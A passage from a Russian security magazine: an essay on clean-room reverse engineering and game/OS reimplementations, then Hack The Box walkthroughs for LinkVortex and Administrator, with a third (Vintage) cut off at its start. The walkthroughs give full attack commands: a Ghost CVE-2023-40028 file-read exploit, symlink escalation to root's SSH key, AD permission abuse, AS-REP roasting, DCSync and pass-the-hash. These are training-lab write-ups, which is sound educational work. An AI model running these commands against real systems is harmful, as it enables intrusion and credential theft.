кода, то есть доработку руками того, что не смог сделать автоматический
декомпилятор. На выходе получается близкий к оригинальному код. Проб‐
лема в том, что декомпилированный код подходит под определение «про‐
изводных произведений» (derivative work), которые нельзя, не нарушая закон,
использовать без разрешения владельца оригинальных авторских прав.
   Разработка в «чистой комнате» (clean room design) — легальный метод
клонирования чужого программного или аппаратного продукта. Это юри‐
дическая стратегия, которая в большинстве случаев успешно защищает
от любых обвинений в нарушении авторских прав.
  Для этого разработчики делятся на две независимые команды. Первая
исследует оригинальный код при помощи дизассемблера или любых других
инструментов. На основе проведенного исследования она пишет специфи‐
кацию — набор документов, которые описывают, как работает продукт.
  В идеале готовую спецификацию проверяет адвокат, чтобы убедиться, что
в ней нет ничего защищаемого законодательством. Дело в том, что автор‐
ское право распространяется не на идею, а на конкретную реализацию.
Однако даже придуманные заново идеи могут подпадать под нарушение
чужих патентов.
   Участники второй команды разрабатывают новый продукт по предос‐
тавленной спецификации. Их работа не может нарушить авторские права, так
как они не видели исходного кода даже в дизассемблере. Иногда такой спо‐
соб разработки называют chinese wall: две группы разработчиков разделены
между собой как бы китайской стеной. Нельзя «украсть» то, что ты никогда
не видел, это правило соблюдается в работе второй группы.
   Одно из первых применений «чистой комнаты» произошло в 1983 году.
Архитектура IBM PC активно завоевывала рынок. Производители клонов IBM
PC были вынуждены покупать лицензионный ROM BIOS. Тогда компания
Phoenix решила выкинуть на рынок свой BIOS, совместимый с IBM PC. Чтобы
избежать  судебных  исков,  одна  команда  исследователей  разобрала
исходный код IBM и написала документацию для BIOS API. А вторая занима‐
лась непосредственно разработкой BIOS, полностью совместимого с име‐
ющимся железом. Метод сработал, и Phoenix удалось избежать юридических
последствий.
   Существуют пограничные ситуации, находящиеся в серой правовой зоне,
например реимплементация оригинального кода на языке более высокого
уровня. Если игру, написанную на ассемблере, портируют на C++, то в теории
чужие авторские права нарушены не будут. Впрочем, и о судебных раз‐
бирательствах по таким делам мне неизвестно. Подробней про такой случай
читай в разделе ScummVM.


RE3

Широко  известный   проект  RE3   представляет  собой  воссозданный
с помощью реверс‑инжиниринга движок GTA 3. На нем игру удалось не толь‐
ко собрать и запустить, но и перенести на платформы, которые она изначаль‐
но не поддерживала, например Nintendo Switch и PSP.
   Реверс кода игры начался в 2014 году, когда появился проект librw. Фак‐
тически это реимплементация движка RenderWare в том виде, в каком он
использовался в GTA 3. Полная декомпиляция игры началась тем же автором
в 2018 году, после чего к нему присоединилось еще несколько энтузиастов.
К началу 2021 года они выпустили свободную реализацию GTA 3 и GTA Vice
City.
  По драматическому стечению обстоятельств проект вышел в том же году,
когда  должен  был  выйти  официальный  ремастер  «Grand  Theft  Auto:
The Trilogy — The Definitive Edition». Сразу после релиза RE3 на GitHub проекту
прилетел бан от правообладателя по закону об авторском праве в цифровую
эпоху (DMCA). По утверждению Rockstar, «эти файлы исходного кода не толь‐
ко содержат производный программный код, который позволяет играм запус‐
каться на компьютере игрока, но и содержат исходный цифровой контент
Take-Two, такой как текст, диалоги персонажей и определенные игровые
ресурсы». Однако к февралю 2023 года разработчики и правообладатели
пришли к мировому соглашению, Rockstar отозвала прошлые иски, тре‐
бующие компенсации ущерба в размере 150 тысяч долларов за каждую игру.
   Обвинение нельзя назвать безосновательным. Код действительно содер‐
жит некоторые необходимые для работы игры ассеты. Кроме того, никто и не
думал скрывать тот факт, что код полностью получен обычным реверсом.
Как было сказано в документе о стилистике кода:

       Don’t just copy paste code from IDA, make it look nice.«                »Очевидно, метод «чистой комнаты» не применялся. Согласно readme, раз‐
работчики заменяли по частям изначальный код игры своим. Старая функция
перехватывалась, и управление передавалось на  код,  восстановленный
в дизассемблере. Таким образом проверялась правильность каждой вос‐
созданной функции. В некотором смысле это иллюстрация парадокса кораб‐
ля Тесея — однажды все функции заменили, а код игры ничуть не изменился.
  Тем не менее даже команде из четырех человек потребовалось четыре
года на восстановление 7 Мбайт исходников на C++. Это объясняет, почему
альтернативный проект OpenRW, с нуля разрабатывающий совместимый
с ресурсами GTA 3 движок игры, делается с 2013-го и до сих пор далек
от завершения.
  В отличие от RE3, OpenRW не повторяет поведение исходной игры.
На скриншотах заметно отсутствие теней и постобработки, и в целом кар‐
тинка выглядит непривычно. Полную совместимость картинки и поведения
игры может дать лишь дословное повторение изначального кода.





          OpenRW дает очевидные графические артефакты


REACTOS

В 1996 году на свет появилась операционная система FreeWin95, позициони‐
рующая себя как свободный клон Windows 95. Через пару лет фокус раз‐
работчиков сместился на Windows NT, и проект получил название ReactOS.
Цель проекта — запуск приложений, написанных для Windows (на данный
момент для Windows XP), на собственном NT-подобном ядре с открытым
исходным кодом.  Сейчас  система  стабильно  работает на  виртуальных
машинах, хотя есть сведения и об успешном использовании на реальном
железе.





             ReactOS все больше напоминает Windows XP

Проект имеет российские корни, поэтому автор, как мне кажется, смотрел
на практики «чистой комнаты» со свойственным многим из нас правовым
нигилизмом. В 2006 году разразился скандал, когда один из иностранных
участников команды ReactOS заявил, что покидает  проект, так как код
ReactOS  содержит  элементы,  полученные  путем  дизассемблирования
Windows. После этого разработчики ReactOS выкатили документ, в котором
обещали заставить новых разработчиков пользоваться «чистой комнатой»,
а весь уже написанный код отправить на проверку. После завершения этой
«проверки» конфликт был фактически исчерпан.
   Недавняя цитата одного из разработчиков ReactOS:

       Да, мы пользуемся реверс‑инжинирингом. Причем здесь есть такая инте‐
       ресная правовая особенность: общественная организация, которую мы соз‐« дали, чтобы собирать донаты и делать какие‑то юридические вещи, зарегис‐
        трирована в Германии, то есть в Евросоюзе. А там некоторое время назад
      был разрешен реверс‑инжиниринг с целью создания совместимого ПО.
     Мы используем данные, которые выкладываются самой Microsoft. Например,
       есть довольно много книжек про то, как внутри устроена Windows. Самая
       известная — Windows Internals. Есть и другие источники — например, иссле‐
       дователи безопасности публикуют внутренности «винды». И мы в этом им
       отчасти помогаем.
      Тем не менее основной способ, с помощью которого мы понимаем, как что
        устроено, — это написание тестов. То есть мы пишем какой‑то тест, который
       дергает апишки в Windows, а потом уже пишем код для ReactOS.                 »Для англоязычной аудитории заявлено использование «чистой комнаты»,
но фактически на это смотрят сквозь пальцы.

      Что касается фактического применения прямо сейчас, основные сценарии,
      которые мы видим на конференциях, в общении с нашими пользователями,« в средствах коммуникации, — это реверс‑инжиниринг Windows. Раньше
       это было интересно в том числе с позиции секьюрити‑ресерча, но со вре‐
      менем мы довольно сильно отстали от свежих версий «винды» в плане
       безопасности. Все‑таки наш проект находится на стадии альфы уже боль‐
     ше 20 лет.
       Те, кто хочет узнать, как устроена Windows, очень часто заглядывают в наши
       исходники. Когда надо понять, как работает тот или иной компонент
       в Windows, в ответах часто можно увидеть ссылки на исходный код ReactOS.
      Даже разработчики, которые пишут драйверы для Windows, пользуются
      нашими исходниками для изучения некоторых нюансов.                 »Я сам как‑то раз брал кусок недокументированного кода из ReactOS, и он
действительно работал неотличимо от оригинала. Так что до утечки исходных
кодов Windows XP это был лучший (помимо сайта ntinternals) источник све‐
дений о недокументированных подсистемах Windows. Не говоря о том, что
можно своими руками пощупать рабочее NT-подобное ядро с открытым
исходным кодом!


SCUMMVM

Что такое ScummVM? Это программа для запуска классических квестов
на современных компьютерах. Изначально создавалась для игр от LucasArts,
таких как Maniac Mansion (1987), однако сейчас способна запускать поряд‐
ка 325 игр, выходивших вплоть до 2002 года. Причем это не эмуляция,
а именно реимплементация исходных кодов!
   Главная фишка проекта — переносимость. Игры для DOS можно запустить
на Android, iOS или даже PSP. Словом, везде, где работает ScummVM.
Для этого разработчики с нуля переписывают оригинальный движок, ста‐
раясь  сохранить  полную  бинарную  совместимость  с  ресурсами  игры.
Это работает как аргумент против обвинений в пиратстве — нельзя запустить
игру, не владея ее лицензионной копией, то есть не имея на руках всех фай‐
лов игры.





         Официальное издание Blade Runner работает на ScummVM

Один из разработчиков ScummVM пояснил, почему проект не атакуют пра‐
вообладатели:

       Потому что мы это делали чуть более осторожно, чем авторы RE3. У нас тоже
      были проблемы с юристами, но мы их успешно разрешили. Одно из главных« правил безопасности проекта — нетолерантность к варезу. Банхаммер всег‐
      да наготове. Это позволило заработать репутацию проекта, соблюдающего
       авторские права.                 »Также автор поясняет, как происходит добавление новых игр:

        Стоит заметить, что добавление игры в ScummVM — это совсем не простая
       задача. На сегодня примерно для половины движков нам удалось получить« исходники от авторов, но даже в этих случаях код всегда нужно перепи‐
       сывать. Так, в последнее время в проект поступает довольно много игр,
       написанных изначально на паскале и ассемблере, и, чтобы их добавить, все
       нужно транслировать в С++. Другая же половина движков получилась путем
        хардкорного реверс‑инжиниринга (по‑другому и не скажешь), когда
      на вооружение берется IDA и мы потихоньку начинаем размечать оригиналь‐
      ный движок названиями функций, переменными и комментариями, слой
       за слоем разбираясь в логике его работы.                 »В итоге юридические проблемы удалось разрешить. Официальным приз‐
нанием можно считать размещение правообладателями в Steam своих ста‐
рых игр, собранных на базе ScummVM. Зачем вкладываться в переработку
движка, если можно взять готовое решение и снова продать игру фанатам?
   Как видим, «серый» подход имеет право на существование. Однако речь
идет о старых играх, давно не приносящих никому доходов. На мой взгляд,
основная задача ScummVM — именно сохранение старых игр как музейных
экспонатов. То, что их можно запустить на любой современной машине в два
клика, продлевает играм жизнь, сберегая культурное наследие для будущих
поколений геймеров.


WINE

Wine расшифровывают в линуксовом духе как Wine Is Not Emulator, хотя нас‐
тоящая расшифровка — WIndows Native Environment. Wine позволяет запус‐
кать Windows-приложения на Unix-подобных системах. Специальный заг‐
рузчик исполняемых файлов подменяет стандартные системные библиотеки
(ntdll, kernel32 и так далее) собственными реализациями тех же интерфейсов,
но вызывающими syscall из ядра Linux. Тонкий слой абстракции симулирует
выполнение WinAPI так, чтобы исходная программа могла работать в Linux,
как будто бы она запущена в Windows.





                    Так выглядит рабочий стол в Wine

Wine известен как проект с одной из самых «чистых комнат». Приведу выдер‐
жку требований из документации по добавлению новых патчей:

       Разработчики Wine часто сталкиваются с недокументированным поведением
      или интерфейсами в Windows. Когда это происходит, они используют метод« чистой комнаты, чтобы не нарушать никаких авторских прав Microsoft.                 »Список правил таков:
 • при попытке понять функцию API Windows напишите тестовую программу,
   которая проверяет поведение WinAPI, после чего добавьте программу
   в набор тестов соответствия;
 • также можно заглянуть в MSDN (но отнеситесь к нему с долей скепсиса);
 • будьте осторожны — если тестовая программа  сработает как надо,
   не смотрите в документацию или заголовочные файлы Microsoft.

А вот список строгих запретов:
 • не дизассемблируйте код Microsoft;
 • не исследуйте отладочные символы для кода Microsoft;
 • не смотрите на исходный код Microsoft, даже если он стал «публичным»
   под какой‑либо лицензией;
 • не смотрите на код ReactOS (даже заголовочные файлы). Большая его
   часть была подвергнута обратному проектированию с использованием
   методов, не подходящих для Wine, и поэтому он не является пригодным
   источником информации.

Последний пункт позабавил, способ разработки ReactOS — секрет Полиши‐
неля. Авторы Wine стараются использовать методы тестирования черным
ящиком, чтобы понять, как работает код, не нарушая лицензию дизассембле‐
ром. На мой взгляд, это приводит к долгому созданию плохо работающей
копии.
   Сейчас активно развивается проект Proton — форк Wine, который раз‐
рабатывают в Valve. Он включает в себя множество патчей и дополнительных
библиотек для улучшения производительности и совместимости с играми.
Proton позволяет запускать в Linux многие игры, написанные для Windows,
и используется в Steam Deck.
  От себя добавлю: наконец‑то корпорация с деньгами наведет порядок
в бардаке, разведенном Wine. Чего стоит winetricks, содержащий базу данных
с настройками совместимости отдельных приложений и устанавливающий
конкретную версию Wine, на которой оно лагает меньше всего. В нормальной
ситуации новые версии не должны ломать то, что работало в старых, но раз‐
работчики Wine незнакомы с этой новаторской мыслью.
   Вскоре после релиза Proton появился порт улучшенной версии Wine
на обычный Linux — PortProton. Его делают ребята с linux-gaming.ru, периоди‐
чески натыкаюсь на их онлайн‑стримы по разработке.
  В Microsoft не давали публичных комментариев о легитимности Wine.
Однако механизм Windows Update заблокирует установку обновлений, если
увидит в реестре конфигурационные ключи от Wine. Тем не менее в 2024 году
в Microsoft передали проект Mono во владение Wine. Mono — свободная
реализация .NET, на которой, к примеру, работают скрипты игрового движка
Unity.


СТОИТ УПОМИНАНИЯ

Существует обширный список игр, которые были подвергнуты восстанов‐
лению обычным дизассемблером или «чистой комнатой». Дальше — несколь‐
ко моих любимых примеров.
   Проект OpenRA представляет собой написанный с нуля на C# движок
для старых стратегий Westwood. Разумеется, он ведет себя иначе, чем ори‐
гинал, но старается максимально ему соответствовать. Не так давно в EA от‐
крыли исходники Red Alert, Tiberian Dawn, Renegade и Zero Hour. Надеюсь,
остальные издатели поступят со своими старыми играми аналогичным обра‐
зом.





     Dune 2000 в OpenRA поддерживает огромное разрешение экрана

Реимплементация первых двух частей Fallout нашего соотечественника поз‐
воляет запустить игру даже на планшете под управлением Android или iOS.
Титанический объем работы, рекомендую к ознакомлению.
   Реверсер galaxyhaxz за два года полностью восстановил исходный код
первой Diablo, из которого вырос полноценный билд под современные сис‐
темы — DevilutionX. Исходники облегчают создание модов, да и просто
узнать, что внутри у любимой игры, небезынтересно.
   Нельзя не упомянуть OpenMW — свободную реимплементацию движка
The Elder Scrolls III, вносящую множество графических улучшений, поддержку
новых платформ. На OpenMW даже работают моды к оригиналу!
   Также на ум приходит реверс игры Full Tilt, известной многим как «пинбол
из Windows XP» или Space Cadet.


             INFO

                          Интересный факт: эту игру специально выкупили
                         у Maxis. Кто бы мог подумать, что в Windows вой‐
                        дет игра разработчиков The Sims?





            Одна из вариаций пинбола, не вошедших в Windows


ВЫВОДЫ

Авторы неофициальных реимплементаций редко объясняют, каким образом
исходный код был «восстановлен», но обычно это нетрудно понять, сравнив
поведение их движка с оригиналом, — практически незаметная разница
в геймплее и картинке говорит о точном восстановлении исходного кода.
При создании нового движка повторить поведение исходной игры в мель‐
чайших подробностях почти нереально либо на это уйдет несколько десяти‐
летий.
   Так что для сохранения игр метод «чистой комнаты» подходит не лучшим
образом. А вот для клонирования чужих продуктов — вполне.
   Метод не дает стопроцентных гарантий, но значительно уменьшает риск
нарваться на судебное преследование за нарушение авторских прав. Хотя,
если ты будешь мешать зарабатывать деньги крупной компании, ее юристы
заинтересуются тобой в любом случае.
   Например, юристы Nintendo судебными исками фактически уничтожили
проект Yuzu — эмулятор Switch, который требовал для работы дампа игры,
секретных ключей и оригинальной прошивки. Разработчики эмуляторов спе‐
циально не включают их в дистрибутив, чтобы не нарваться на проблемы
с законом.





                   Эмулятор Yuzu собственной персоной

Впрочем, сразу после скандала появилось несколько новых форков от ано‐
нимных разработчиков. Nintendo рассылает жалобы, и зеркала исходников
банятся на GitHub, однако проект Yuzu продолжает жить под новой вывеской.
ВЗЛОМ





В  этом  райтапе  я  покажу,  как  можно
повысить  привилегии в  Linux,  используя
ссылки на важные файлы. Но прежде чем
получить доступ к операционной системе,
мы посканируем веб‑приложение и  выг‐            RalfHacker                                                                                             hackerralf8@gmail.com
рузим его исходные коды для анализа. Так‐
же прочитаем критические данные через
LFI в системе Ghost.


Наша цель — получение прав суперпользователя на машине LinkVortex
с учебной площадки Hack The Box. Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.47    linkvortex.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Apache.

По отчету сканирования видно, что на сервере развернута CMS Ghost 5.58,
а также доступен файл robots.txt, содержащий список каталогов, которые
не должен индексировать веб‑сервер.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте ничего интересного найти не удалось, поэтому приступим к ска‐
нированию.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — HTTP-заголовок.

Место перебора помечается словом FUZZ.



Задаем параметры и запускаем ffuf:


ffuf -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -w
subdomains-top1million-110000.txt -t 128





                       Результат сканирования поддоменов

В вывод попадают все варианты из списка, а значит, установим фильтр
по коду ответа (параметр -fc).


ffuf -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -w
subdomains-top1million-110000.txt -t 128 -fc 301



                       Результат сканирования поддоменов

Теперь программа вывела только один поддомен dev. Обновляем запись
в файле /etc/hosts и проверяем новый сайт через браузер.


10.10.11.47 linkvortex.htb dev.linkvortex.htb





                         Главная страница сайта dev

На сайте ничего интересного, но мы еще можем посканировать новый домен
на предмет скрытых файлов и каталогов. На этот раз возьмем feroxbuster .
При запуске используем следующие параметры:
 • -u — URL;
 • -w — словарь (из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.


feroxbuster -u http://dev.linkvortex.htb/ -w files_interesting.txt -d
1 -t 128





                        Результат сканирования каталогов

Среди найденных каталогов присутствует .git, а значит, мы можем скопиро‐
вать весь репозиторий с помощью git-dumper.


git-dumper http://dev.linkvortex.htb/.git/ .





                        Клонирование репозитория

Теперь поищем что‑нибудь интересное в исходном коде веб‑приложения.


ТОЧКА ОПОРЫ

Открываем репозиторий в VS Code и переходим к истории коммитов.





                            История коммитов

В файле Dockerfile.ghost указан JSON-конфиг, но в каталоге его нет.





                   Содержимое файла Dockerfile.ghost

А вот в файле authentication.test.js есть два пароля, старый и новый.





                  Содержимое файла authentication.test.js

Осталось найти имя пользователя. На одной из страниц сайта можно увидеть,
что автор статьи — admin.





            Содержимое страницы The Random Access Memory

Так как в качестве логина нужно указать почту, попробуем использовать
домен linkvortex.htb.





                          Страница авторизации

Все получилось, и у нас теперь есть доступ администратора к панели CMS
Ghost.





                          Панель администратора


LFI
Обычно админка в CMS дает нам возможность получить RCE, поэтому стоит
проверить, есть ли для Ghost готовые эксплоиты. Можем просто поискать их
в Google.





                         Поиск эксплоитов в Google

Так нашелся репозиторий с эксплоитом для уязвимости CVE-2023-40028.
CMS Ghost до версии 5.59.1 содержит уязвимость, которая позволяет аутен‐
тифицированным пользователям читать произвольные файлы. Для начала
попробуем прочитать файл /etc/passwd.


python3 ghost_fileread.py -t http://linkvortex.htb/ -u
admin@linkvortex.htb -p OctopiFociPilfer45 -f /etc/passwd





                     Содержимое файла /etc/passwd

Вспомним про JSON-конфиг config.production.json, указанный в файле
Dockerfile.ghost, и прочитаем его на сервере.


python3 ghost_fileread.py -t http://linkvortex.htb/ -u
admin@linkvortex.htb -p OctopiFociPilfer45 -f /var/lib/ghost/config.
production.json





                 Содержимое файла config.production.json

В файле есть учетные данные пользователя bob, а такая учетная запись была
в файле /etc/passwd. Авторизуемся по SSH и забираем первый флаг.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Теперь нам необходимо собрать информацию для повышения привилегий
в ОС. Я буду использовать для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. Затем посмотрим, что интересного он нашел.
   Судя по настройкам sudoers, мы можем без ввода пароля выполнить
скрипт /opt/ghost/clean_symlink.sh в привилегированном контексте.




                               Настройки sudoers

Давай посмотрим, что это за скрипт. Он принимает в качестве аргумента
файл с расширением .png. Внутри делается проверка: если файл — сим‐
волическая ссылка, то она не должна указывать на каталоги etc и root. Если
все проверки пройдены, то выполняется копирование файла. При этом если
переменная среды CHECK_CONTENT установлена, то будет отображено содер‐
жимое файла.





                  Содержимое скрипта clean_symlink.sh

Однако мы легко пройдем проверку, если символическая ссылка будет ука‐
зывать на другую символическую ссылку. Вторую ссылку можем направить
на приватный ключ SSH пользователя root.
   Сделаем символическую ссылку test.txt, указывающую на ключ SSH,
затем ссылку test.png, указывающую на test.txt. Когда все готово, запус‐
каем скрипт и указываем ему test.png.


ln -s /root/.ssh/id_rsa test.txt
ln -s /home/bob/test.txt test.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /
home/bob/test.png





                         Содержимое ключа SSH

Сохраняем ключ на свою машину, назначаем необходимые права и подклю‐
чаемся к серверу от имени root.


chmod 0600 id_rsa
ssh -i id_rsa root@10.10.11.47





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этот раз я покажу, как можно эксплуати‐
ровать  цепочку чрезмерных разрешений
Active  Directory. Мы  завладеем FTP-сер‐
вером, потом разберемся с менеджером
паролей и вытащим из него учетку поль‐            RalfHacker                                                                                             hackerralf8@gmail.com
зователя.    Затем     проэксплуатируем
еще одну цепочку чрезмерных разрешений
для выполнения DCSync и захвата всего
домена.


Конечная цель — получение прав суперпользователя на машине Administrator
с учебной площадки Hack The Box. Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.42    Administrator.htb

На этот раз, помимо IP-адреса машины, нам также предоставляют и учетные
данные с правами пользователя домена.





                         Информация о машине

Запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел 13 открытых портов:
 • 21 — FTP;
 • 88 — Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC);
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.

Проверим выданные учетные данные с помощью NetExec.


nxc smb 10.10.11.42 -u olivia -p ichliebedich



                        Результат проверки учетных данных


СБОР ДАННЫХ

На сервере работают службы WinRM и FTP, поэтому стоит проверить уровень
доступа к ним в контексте текущей учетной записи.


nxc winrm 10.10.11.42 -u olivia -p ichliebedich



                           Проверка службы WinRM


nxc ftp 10.10.11.42 -u olivia -p ichliebedich



                             Проверка службы FTP

Мы можем получить сессию через WinRM, но доступа к FTP у нас нет.
   Теперь получим  список  пользователей.  Иногда в  описании  учетных
записей можно найти много интересного. Для такого запроса в NetExec есть
параметр --users.


nxc ldap 10.10.11.42 -u olivia -p ichliebedich --users





                          Список пользователей

Ничего интересного не находим, поэтому авторизуемся в службе WinRM
через Evil-WinRM.


evil-winrm -i 10.10.11.42 -u olivia -p ichliebedich





                       Информация о пользователе

В рабочем окружении пользователя ничего интересного не находим, поэтому
соберем базу для BloodHound.


Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее мож‐
но использовать, чтобы легко идентифицировать очень сложные пути атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для Windows — на PowerShell или C# — и для Linux — на Python.


Запускаем сбор информации при помощи SharpHound:


SharpHound.exe -c All --domaincontroller 10.10.11.42 --ldapusername
olivia --ldappassword ichliebedich -d administrator.htb





                    Сбор базы BloodHound

Скачиваем  собранную  базу  командой  download  и  загружаем  в  сам
BloodHound, после чего строим граф от имеющегося у нас пользователя
olivia.





                       Граф BloodHound

У нас есть путь до учетной записи benjamin, давай пройдем по нему и ском‐
прометируем все узлы.


ПРОДВИЖЕНИЕ

Пользователь benjamin
Для эксплуатации чрезмерных разрешений будем использовать bloodyAD.
Первое разрешение, которым мы воспользуемся, — это GenericAll учетной
записи OLIVIA на учетную запись пользователя MICHAEL. Так мы можем уста‐
новить подконтрольному пользователю новый пароль.


bloodyAD --host 10.10.11.42 -u olivia -p ichliebedich -d
administrator.htb set password MICHAEL '!Q@W3e4r'



                       Назначение нового пароля

В свою очередь, учетная запись MICHAEL имеет право изменения пароля
ForceChangePassword для учетной записи пользователя BENJAMIN.


bloodyAD --host 10.10.11.42 -u MICHAEL -p '!Q@W3e4r' -d
administrator.htb set password BENJAMIN '!Q@W3e4r'



                       Назначение нового пароля

Пользователь BENJAMIN состоит в группе SHARE MODERATORS. Никаких общих
каталогов на хосте нет, а значит, стоит проверить, есть ли у этого пользовате‐
ля доступ к FTP-серверу.


nxc ftp 10.10.11.42 -u BENJAMIN -p '!Q@W3e4r'



                           Проверка учетных данных

У пользователя есть разрешения для авторизации на службе FTP.


Пользователь emily
Подключаемся к FTP-серверу. Там находим всего один файл Backup.psafe3,
который скачиваем на локальную машину.





                        Содержимое FTP-сервера

Этот файл — база менеджера паролей Password Safe. База защищена
паролем, который можно сбрутить. Для этого с помощью pwsafe2john
получаем хеш для перебора.


python3 pwsafe2john.py Backup.psafe3


                                Получение хеша

Записываем хеш в файл и брутим с помощью john.


john --wordlist=rockyou.txt pwsafe_hash.txt





                             Результат подбора пароля

Скачиваем менеджер паролей и открываем базу.





                         Расшифровывание базы





                           Содержимое базы

В базе находим три учетки, среди которых валидная только emily.


nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb



                           Проверка учетных данных

Подключаемся по WinRM и забираем первый флаг.



                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Перестраиваем граф BloodHound от нового пользователя и получаем путь
компрометации всего домена.





                       Граф BloodHound

Учетная запись emily имеет право GenericWrite на учетную запись поль‐
зователя ETHAN. Это право не позволяет изменить пароль, но дает воз‐
можность менять параметры учетной записи. Например, мы можем в UAC
учетной записи активировать поле «Не требовать предварительной проверки
Kerberos», что позволит провести атаку AS-REP Roasting.


bloodyAD --host 10.10.11.42 -d administrator.htb -u emily -p
UXLCI5iETUsIBoFVTj8yQFKoHjXmb add uac ETHAN -f DONT_REQ_PREAUTH



                     Изменение UAC пользователя

Проводим AS-REP Roasting и получаем хеш, по которому будем подбирать
пароль.


nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
--asreproast asrep.txt




                             Результат AS-REP Roasting

Брутить хеш будем с помощью hashcat, который автоматически распознает
тип хеша, а значит, никаких дополнительных параметров указывать не нужно.


hashcat asrep.txt rockyou.txt





                             Результат подбора пароля

Так мы компрометируем учетную запись пользователя ethan, которая, судя
по графу BloodHound, имеет право репликации учетных данных с контроллера
домена. Выполняем DCSync для получения хеша доменного администратора.


impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
-just-dc-user administrator





                          Учетные данные админа

С полученным хешем подключаемся по WinRM и забираем последний флаг.


evil-winrm -i 10.10.11.42 -u administrator -H
3dc553ce4b9fd20bd016e098d2d2fd2e



                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я покажу процесс  эксплуатации
цепочки  уязвимостей  в  Active  Directory.
Небезопасные списки доступа дадут нам
сессию на хосте, а учетную запись адми‐
                                                                                         RalfHacker
                                                                                             hackerralf8@gmail.comнистратора мы сможем заполучить, обна‐
ружив сохраненные учетные данные и груп‐
пу с делегированием.


Наша цель — получение прав суперпользователя на машине Vintage с учеб‐
ной площадки Hack The Box. Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.45    vintage.htb

Помимо IP-адреса, нам на этот раз дают учетные данные с правами поль‐
зователя домена.





                         Информация о машине

Запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
